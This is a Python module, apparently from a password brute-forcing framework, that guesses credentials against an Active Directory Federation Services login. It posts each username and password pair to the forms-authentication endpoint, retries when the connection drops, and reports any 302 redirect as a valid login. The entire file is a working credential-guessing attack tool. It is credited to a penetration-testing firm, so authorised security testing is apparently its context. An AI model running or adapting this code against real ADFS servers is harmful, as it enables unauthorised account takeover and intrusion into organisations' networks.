import requests
from bfg.module import Module as BModule
from bfg.shortcuts.http import Module,HTTPModule
from logging import getLogger,INFO
from time import sleep

getLogger('urllib3.connectionpool').setLevel(INFO)

class Module(HTTPModule):

    brief_description = 'Active Directory Federated Services'

    description = ('Brute force an ADFS server. NOTE: this module has '
    'not been thoroughly tested and is crude. It effectively '
    'takes a base URL, and just updates the POST body with the supppl'
    'ied credentials. It may not work on all ADFS versions.')

    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    verified_functional = True

    def __call__(self, username, password, *args, **kwargs):
        '''Make the module callable.

        During testing it appeared as though valid credentials always
        resulted in a 302 redirect, so that's what we test for in the
        logic below.
        '''

        # Craft the payload
        payload = {
            'UserName':username,
            'Password':password,
            'AuthMethod':'FormsAuthentication',
        }
        
        try:

            # Make the request while ignoring redirects
            resp = requests.post(
                **self.request_args,
                data=payload)

        except requests.exceptions.ConnectionError:
            # ADFS appears to fall over on occasion
            # Sleep for a few moments, then try again

            sleep(5)
            resp = requests.post(
                self.url,
                data=payload,
                proxies=self.proxies,
                headers=self.headers,
                allow_redirects=False)

        # Credentials should be valid on a 302 redirect
        if resp.status_code == 302:
            valid = 1
        else:
            valid = 0

        # Return the outcome
        return dict(
                outcome=valid,
                username=username,
                password=password,
                events=[])

